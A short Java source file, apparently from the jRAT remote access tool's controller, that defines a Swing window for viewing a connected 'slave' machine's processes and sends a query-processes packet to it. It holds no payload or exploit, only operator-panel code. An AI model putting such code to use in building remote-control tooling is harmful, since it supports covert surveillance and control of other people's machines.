package jrat.module.process;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.ui.frames.BaseFrame;

import javax.swing.*;


@SuppressWarnings("serial")
public class FrameRemoteProcess extends BaseFrame {

	private PanelControlRemoteProcess panel;

	public FrameRemoteProcess(Slave sl) {
		super(sl);
		setTitle("Remote Process - " + sl.getIP() + " - " + sl.getHostname());
		setIconImage(Resources.getIcon("process").getImage());
		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 535, 326);
		
		panel = new PanelControlRemoteProcess(sl);
		
		add(panel);
	}

	public void list() {
		slave.addToSendQueue(new PacketQueryProcesses());
	}

	public PanelControlRemoteProcess getPanel() {
		return panel;
	}
}
